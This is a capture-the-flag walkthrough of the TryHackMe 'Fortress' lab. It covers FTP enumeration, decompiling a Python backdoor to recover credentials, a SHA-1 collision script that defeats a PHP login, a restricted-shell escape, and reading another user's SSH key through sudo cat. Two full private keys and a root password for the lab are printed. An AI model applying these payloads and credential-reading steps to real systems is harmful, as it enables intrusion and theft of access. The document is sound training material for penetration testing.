# 90 - Fortress (decompile python code, SHA1 collisions)

Room Link --> [https://tryhackme.com/room/fortress](https://tryhackme.com/room/fortress)

### Enumeration

{% code overflow="wrap" lineNumbers="true" %}
```bash
PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.10
5581/tcp open  ftp     syn-ack ttl 63 vsftpd 3.0.3
5752/tcp open  unknown syn-ack ttl 63
7331/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu))
```
{% endcode %}

#### FTP enum

{% code overflow="wrap" %}
```bash
dking@dking ~/Downloads$ ftp fortress.thm -P 5581                                                               
Connected to fortress.thm.
220 (vsFTPd 3.0.3)
Name (fortress.thm:dking): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -al
229 Entering Extended Passive Mode (|||42471|)
150 Here comes the directory listing.
drwxr-xr-x    2 ftp      ftp          4096 Jul 25  2021 .
drwxr-xr-x    2 ftp      ftp          4096 Jul 25  2021 ..
-rw-r--r--    1 ftp      ftp          1255 Jul 25  2021 .file
-rw-r--r--    1 ftp      ftp           305 Jul 25  2021 marked.txt
226 Directory send OK.
ftp> 
```
{% endcode %}

{% code overflow="wrap" %}
```
dking@dking ~/Downloads$ cat marked.txt                                                                        
If youre reading this, then know you too have been marked by the overlords... Help memkdir /home/veekay/ftp I have been stuck inside this prison for days no light, no escape... Just darkness... Find the backdoor and retrieve the key to the map... Arghhh, theyre coming... HELLLPPPPPmkdir /home/veekay/ftp
```
{% endcode %}

The second file turned out to be a compiled `python` file.

{% code overflow="wrap" %}
```bash
dking@dking ~/Downloads$ file .file                                                                            
.file: python 2.7 byte-compiled
```
{% endcode %}

We can use `uncompyle6` to decompile the file.

```
pip install uncompyle6
```

```bash
(myenv_python3_9) dking@dking ~/Downloads$ python /opt/python-uncompyle6/uncompyle6/bin/uncompile.py file.pyc 
# uncompyle6 version 3.9.0
# Python bytecode version base 2.7 (62211)
# Decompiled from: Python 3.9.9 (main, Oct 12 2023, 15:20:50) 
# [GCC 13.2.0]
# Embedded file name: ../backdoor/backdoor.py
# Compiled at: 2021-04-29 03:56:57
import socket, subprocess
from Crypto.Util.number import bytes_to_long
usern = 232340432076717036154994
passw = 10555160959732308261529999676324629831532648692669445488
port = 5752
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind(('', port))
s.listen(10)

def secret():
    with open('secret.txt', 'r') as (f):
        reveal = f.read()
        return reveal


while True:
    try:
        conn, addr = s.accept()
        conn.send('\n\tChapter 1: A Call for help\n\n')
        conn.send('Username: ')
        username = conn.recv(1024).decode('utf-8').strip()
        username = bytes(username, 'utf-8')
        conn.send('Password: ')
        password = conn.recv(1024).decode('utf-8').strip()
        password = bytes(password, 'utf-8')
        if bytes_to_long(username) == usern and bytes_to_long(password) == passw:
            directory = bytes(secret(), 'utf-8')
            conn.send(directory)
            conn.close()
        else:
            conn.send('Errr... Authentication failed\n\n')
            conn.close()
    except:
        continue
# okay decompiling file.pyc

```

Here we see username and password which are hard coded converted from string to `byte_to_long` format , so let's try to convert a random string to see a long byte format also we can convert it back to a byte string using `long_to_bytes`

```python
# using this script.
from Crypto.Util.number import long_to_bytes

username = 232340432076717036154994
passw = 10555160959732308261529999676324629831532648692669445488

un = long_to_bytes(username)
pw = long_to_bytes(passw)

print(un)
print(pw)
```

```bash
(myenv_python3_9) dking@dking ~/Downloads$ python exp.py
1337-h4x0r
n3v3r_g0nn4_g1v3_y0u_up
```

We get this text `t3mple_0f_y0ur_51n5` which is from that `secrets.txt` because it was calling the function which would return the contents of that file on providing correct credentials.

Looking at the uncompiled python code, we see its making reference to port 5752, we can connect to it using Netcat. enter the username and password.

```bash
dking@dking ~/Downloads$ nc 10.10.134.68 5752 

	Chapter 1: A Call for help

Username: 1337-h4x0r
Password: n3v3r_g0nn4_g1v3_y0u_up
t3mple_0f_y0ur_51n5
```

#### HTTP enum port 7331

On the apache web server we only get the default web page , I tried running `gobuster` with `big.txt` , `common.txt` but came up with nothing , so then tried look for the page we got from secrets.txt but it didn't loaded until I added a php extension to it

<figure><img src="https://miro.medium.com/v2/resize:fit:481/0*89vGHNzhpBuwAA2w" alt="" height="310" width="700"><figcaption></figcaption></figure>

Again we don’t see much on this page but after viewing the source code through ctrl+u

<figure><img src="https://miro.medium.com/v2/resize:fit:481/0*Ps9qtI5v8Xj9k1zt" alt="" height="279" width="700"><figcaption></figcaption></figure>

The reason why we are seeing html code is because browser executes php code but renders html code that’s why we can html tags here , also going to css file we can get a “hint”

<figure><img src="https://miro.medium.com/v2/resize:fit:481/0*VO9SiNl0SLXXCq05" alt="" height="339" width="700"><figcaption></figcaption></figure>

{% code overflow="wrap" %}
```bash
VGhpcyBpcyBqb3VybmV5IG9mIHRoZSBncmVhdCBtb25rcywgbWFraW5nIHRoaXMgZm9ydHJlc3MgYSBzYWNyZWQgd29ybGQsIGRlZmVuZGluZyB0aGUgdmVyeSBvd24gb2YgdGhlaXIga2luZHMsIGZyb20gd2hhdCBpdCBpcyB0byBiZSB1bmxlYXNoZWQuLi4gVGhlIG9ubHkgb25lIHdobyBjb3VsZCBzb2x2ZSB0aGVpciByaWRkbGUgd2lsbCBiZSBncmFudGVkIGEgS0VZIHRvIGVudGVyIHRoZSBmb3J0cmVzcyB3b3JsZC4gUmV0cmlldmUgdGhlIGtleSBieSBDT0xMSURJTkcgdGhvc2UgZ3VhcmRzIGFnYWluc3QgZWFjaCBvdGhlci4=
	
# decoded
This is journey of the great monks, making this fortress a sacred world, defending the very own of their kinds, from what it is to be unleashed... The only one who could solve their riddle will be granted a KEY to enter the fortress world. Retrieve the key by COLLIDING those guards against each other.
```
{% endcode %}

So we just change the extension from `.php` to `.html` .

[http://fortress.thm:7331/t3mple\_0f\_y0ur\_51n5.html](http://fortress.thm:7331/t3mple\_0f\_y0ur\_51n5.html)

And we got a different page with input fields also viewing the html source code

```php
<!--
<?php
require 'private.php';
$badchar = '000000';
if (isset($_GET['user']) and isset($_GET['pass'])) {
    $test1 = (string)$_GET['user'];
    $test2 = (string)$_GET['pass'];

    $hex1 = bin2hex($test1);
    $hex2 = bin2hex($test2);
    

    if ($test1 == $test2) {
        print 'You can't cross the gates of the temple, GO AWAY!!.';
    } 
    
    else if(strlen($test2) <= 500 and strlen($test1) <= 600){
    	print "<pre>Nah, babe that ain't gonna work</pre>";
    }

    else if( strpos( $hex1, $badchar ) or strpos( $hex2, $badchar )){
    	print '<pre>I feel pitty for you</pre>';
    }
    
    else if (sha1($test1) === sha1($test2)) {
      print "<pre>'Private Spot: '$spot</pre>";
    } 
    
    else {
        print '<center>Invalid password.</center>';
    }
}
?>
-->

<!-- Don't believe what you see... This is not the actual door to the temple. -->
```

What it’s doing is that , taking two GET parameters `user` and `pass` doing a type check also checking it's SHA-1 hash if they are similar which is what we call hash collision and back in 2017 someone discovered a collision in SHA-1 by calculating the hash of two pdf files

<figure><img src="https://miro.medium.com/v2/resize:fit:481/0*RnIfpugXe0Z86D5G" alt="" height="262" width="700"><figcaption></figcaption></figure>

Google about SHA1 collisions, and what possible ways there were to generate them.

Eventually I came across this great writeup, [https://github.com/bl4de/ctf/blob/master/2017/BostonKeyParty\_2017/Prudentialv2/Prudentialv2\_Cloud\_50.md](https://github.com/bl4de/ctf/blob/master/2017/BostonKeyParty\_2017/Prudentialv2/Prudentialv2\_Cloud\_50.md)

[https://arz101.medium.com/tryhackme-fortress-b1bafe0cfa9b](https://arz101.medium.com/tryhackme-fortress-b1bafe0cfa9b)

Using the research they had done, I was able to create a python script that successfully matched all the criteria to obtain the `$spot` variable.

```python
import requests

username = '255044462D312E33 0A25E2E3 CFD30A0A 0A312030 206F626A 0A3C3C2F 57696474 68203220 3020522F 48656967 68742033 20302052 2F547970 65203420 3020522F 53756274 79706520 35203020 522F4669 6C746572 20362030 20522F43 6F6C6F72 53706163 65203720 3020522F 4C656E67 74682038 20302052 2F426974 73506572 436F6D70 6F6E656E 7420383E 3E0A7374 7265616D 0AFFD8FF FE002453 48412D31 20697320 64656164 21212121 21852FEC 09233975 9C39B1A1 C63C4C97 E1FFFE01 7F46DC93 A6B67E01 3B029AAA 1DB2560B 45CA67D6 88C7F84B 8C4C791F E02B3DF6 14F86DB1 690901C5 6B45C153 0AFEDFB7 6038E972 722FE7AD 728F0E49 04E046C2 30570FE9 D41398AB E12EF5BC 942BE335 42A4802D 98B5D70F 2A332EC3 7FAC3514 E74DDC0F 2CC1A874 CD0C7830 5A215664 61309789 606BD0BF 3F98CDA8 044629A1 3C68746D 6C3E0A3C 73637269 7074206C 616E6775 6167653D 6A617661 73637269 70742074 7970653D 22746578 742F6A61 76617363 72697074 223E0A3C 212D2D20 40617277 202D2D3E 0A0A7661 72206820 3D20646F 63756D65 6E742E67 6574456C 656D656E 74734279 5461674E 616D6528 2248544D 4C22295B 305D2E69 6E6E6572 48544D4C 2E636861 72436F64 65417428 31303229 2E746F53 7472696E 67283136 293B0A69 66202868 203D3D20 27373327 29207B0A 20202020 646F6375 6D656E74 2E626F64 792E696E 6E657248 544D4C20 3D20223C 5354594C 453E626F 64797B62 61636B67 726F756E 642D636F 6C6F723A 5245443B 7D206831 7B666F6E 742D7369 7A653A35 3030253B 7D3C2F53 54594C45 3E3C4831 3E262378 31663634 383B3C2F 48313E22 3B0A7D20 656C7365 207B0A20 20202064 6F63756D 656E742E 626F6479 2E696E6E 65724854 4D4C203D 20223C53 54594C45 3E626F64 797B6261 636B6772 6F756E64 2D636F6C 6F723A42 4C55453B 7D206831 7B666F6E 742D7369 7A653A35 3030253B 7D3C2F53 54594C45 3E3C4831 3E262378 31663634 393B3C2F 48313E22 3B0A7D0A 0A3C2F73 63726970 743E0A0A'
password = '25504446 2D312E33 0A25E2E3 CFD30A0A 0A312030 206F626A 0A3C3C2F 57696474 68203220 3020522F 48656967 68742033 20302052 2F547970 65203420 3020522F 53756274 79706520 35203020 522F4669 6C746572 20362030 20522F43 6F6C6F72 53706163 65203720 3020522F 4C656E67 74682038 20302052 2F426974 73506572 436F6D70 6F6E656E 7420383E 3E0A7374 7265616D 0AFFD8FF FE002453 48412D31 20697320 64656164 21212121 21852FEC 09233975 9C39B1A1 C63C4C97 E1FFFE01 7346DC91 66B67E11 8F029AB6 21B2560F F9CA67CC A8C7F85B A84C7903 0C2B3DE2 18F86DB3 A90901D5 DF45C14F 26FEDFB3 DC38E96A C22FE7BD 728F0E45 BCE046D2 3C570FEB 141398BB 552EF5A0 A82BE331 FEA48037 B8B5D71F 0E332EDF 93AC3500 EB4DDC0D ECC1A864 790C782C 76215660 DD309791 D06BD0AF 3F98CDA4 BC4629B1 3C68746D 6C3E0A3C 73637269 7074206C 616E6775 6167653D 6A617661 73637269 70742074 7970653D 22746578 742F6A61 76617363 72697074 223E0A3C 212D2D20 40617277 202D2D3E 0A0A7661 72206820 3D20646F 63756D65 6E742E67 6574456C 656D656E 74734279 5461674E 616D6528 2248544D 4C22295B 305D2E69 6E6E6572 48544D4C 2E636861 72436F64 65417428 31303229 2E746F53 7472696E 67283136 293B0A69 66202868 203D3D20 27373327 29207B0A 20202020 646F6375 6D656E74 2E626F64 792E696E 6E657248 544D4C20 3D20223C 5354594C 453E626F 64797B62 61636B67 726F756E 642D636F 6C6F723A 5245443B 7D206831 7B666F6E 742D7369 7A653A35 3030253B 7D3C2F53 54594C45 3E3C4831 3E262378 31663634 383B3C2F 48313E22 3B0A7D20 656C7365 207B0A20 20202064 6F63756D 656E742E 626F6479 2E696E6E 65724854 4D4C203D 20223C53 54594C45 3E626F64 797B6261 636B6772 6F756E64 2D636F6C 6F723A42 4C55453B 7D206831 7B666F6E 742D7369 7A653A35 3030253B 7D3C2F53 54594C45 3E3C4831 3E262378 31663634 393B3C2F 48313E22 3B0A7D0A 0A3C2F73 63726970 743E0A0A'

username = ''.join(username.split(' '))
password = ''.join(password.split(' '))

usernamestr = ''.join(['%' + username[i] + username[i + 1] for i in range(0, len(username)) if i % 2 == 0])
passwordstr = ''.join(['%' + password[i] + password[i + 1] for i in range(0, len(password)) if i % 2 == 0])

response = requests.get('http://fortress.thm:7331/t3mple_0f_y0ur_51n5.php?user={}&pass={}'.format(usernamestr, passwordstr), proxies={'http':'http://localhost:8080'})

print(response.text)
```

```bash
# we run the script.
dking@dking ~/Downloads$ python x.py | html2text

'The guards are in a fight with each other... Quickly retrieve the key and
leave the temple: 'm0td_f0r_j4x0n.txt
```

Navigating to --> [http://fortress.thm:7331/m0td\_f0r\_j4x0n.txt](http://fortress.thm:7331/m0td\_f0r\_j4x0n.txt)

```bash
"The Temple guards won't betray us, but I fear of their foolishness that will take them down someday. 
I am leaving my private key here for you j4x0n. Prepare the fort, before the enemy arrives"
												- h4rdy

-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----


```

We logged in as hardy.

```bash
dking@dking ~/Downloads$ ssh -i id_rsa h4rdy@fortress.thm
```

We are however dropped into a restricted shell, and can pretty much not do anything.

SO i just issued "bash" with the login cmd:

```bash
ssh -i id_rsa h4rdy@fortress.thm "bash --noprofile"
export PATH=/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin:$PATH
```

And it worked

### Priv Esc to j4xon

`sudo -l` - we can execute `cat` as j4xon user.

We can try to read his ssh private key.

```
h4rdy@fortress:~$ sudo -u j4x0n /bin/cat /home/j4x0n/.ssh/id_rsa
sudo -u j4x0n /bin/cat /home/j4x0n/.ssh/id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----

```

And login.

### Priv Esc

{% code overflow="wrap" %}
```bash
j4x0n@fortress:~$ cat endgame.txt 
Bwahahaha, you're late my boi!! I have already patched everything... There's nothing you can exploit to gain root... Accept your defeat once and for all, and I shall let you leave alive.
j4x0n@fortress:~$ 
```
{% endcode %}

I find a rabbit hole located in the /opt folder, but immediately after that notice the /data directory.

In here we have a setup.sh file, that is used to set up the machine each time it is spun up.

I can find the flags, and the root password in here.

```
cat setup.sh
# sudo bash -c "echo 'root:3a17cfcca1aabc245a2d5779615643ae' | chpasswd"
```

Done!

